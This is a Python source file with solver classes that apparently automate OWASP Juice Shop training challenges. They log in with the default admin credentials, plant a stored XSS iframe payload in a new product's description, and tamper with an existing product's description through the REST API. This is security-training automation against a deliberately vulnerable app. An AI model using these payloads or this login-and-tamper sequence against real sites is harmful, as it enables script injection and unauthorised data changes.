from core.base_solver import BaseSolver
from loguru import logger
import time

class RestfulXssSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "restfulXssChallenge"

    def solve(self) -> bool:
        # 1. Login as admin
        login_res = self.client.post("/rest/user/login", json={
            "email": "admin@juice-sh.op", 
            "password": "admin123"
        })
        auth = login_res.json().get("authentication", {})
        token = auth.get("token")
        if not token: return False

        headers = {"Authorization": f"Bearer {token}"}
        # Payload must match models/product.ts verify logic: <iframe src="javascript:alert(`xss`)">
        # The verify logic in models/product.ts uses explicit backticks in the finding string.
        payload_str = '<iframe src="javascript:alert(`xss`)">'
        
        # 2. Try POST /api/Products
        payload = {
            "name": f"XSS_Prod_{int(time.time())}",
            "description": payload_str,
            "price": 999,
            "image": "xss.png"
        }
        res = self.client.post("/api/Products", json=payload, headers=headers)
        return res.status_code == 201

class ProductTamperingSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "changeProductChallenge"

    def solve(self) -> bool:
        # 1. Login
        login_res = self.client.post("/rest/user/login", json={"email": "admin@juice-sh.op", "password": "admin123"})
        token = login_res.json().get("authentication", {}).get("token")
        if not token: return False
        headers = {"Authorization": f"Bearer {token}"}
        
        # 2. Tamper with product linked to 'urlForProductTamperingChallenge'
        # In default.yml: O-Saft.
        # Check source code (verify.ts):
        # if (utils.contains(osaft.description, `<a href="${config.get<string>('challenges.overwriteUrlForProductTamperingChallenge')}" target="_blank">`))
        # config default: 'https://owasp.slack.com'
        # Finding the product ID for O-Saft.
        
        search_res = self.client.get("/rest/products/search?q=O-Saft")
        products = search_res.json().get("data", [])
        if not products:
             logger.warning("O-Saft product not found")
             return False
        
        product_id = products[0].get("id")
        
        # Construct exact payload required by verify.ts logic
        # Must contain: <a href="https://owasp.slack.com" target="_blank">
        
        target_content = '<a href="https://owasp.slack.com" target="_blank">More info</a>'
        payload = {"description": f"O-Saft description with {target_content}"}
        
        # Try PUT /api/Products/:id
        res = self.client.put(f"/api/Products/{product_id}", json=payload, headers=headers)
        
        # Trigger verification logic (passive check in verify.ts)
        self.client.get("/rest/products/search?q=O-Saft")
        
        return res.status_code == 200
